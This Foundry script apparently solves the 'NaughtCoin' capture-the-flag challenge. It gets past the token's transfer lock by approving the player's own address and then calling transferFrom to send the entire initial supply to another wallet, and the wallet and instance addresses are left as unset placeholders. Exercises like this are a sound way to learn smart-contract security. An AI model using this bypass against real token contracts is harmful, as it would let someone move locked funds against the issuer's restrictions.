pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract script_NaughtCoin is Script
{
    address player;          // your main wallet
    address otherAddress;    // your other wallet
    address contractAddress; // instance address

    function run() external
    {
        vm.startBroadcast();

        NaughtCoin naughtCoin = NaughtCoin(contractAddress);
        uint amount = naughtCoin.INITIAL_SUPPLY();

        naughtCoin.approve(player, amount);
        naughtCoin.transferFrom(player, otherAddress, amount);

        vm.stopBroadcast();
    }
}
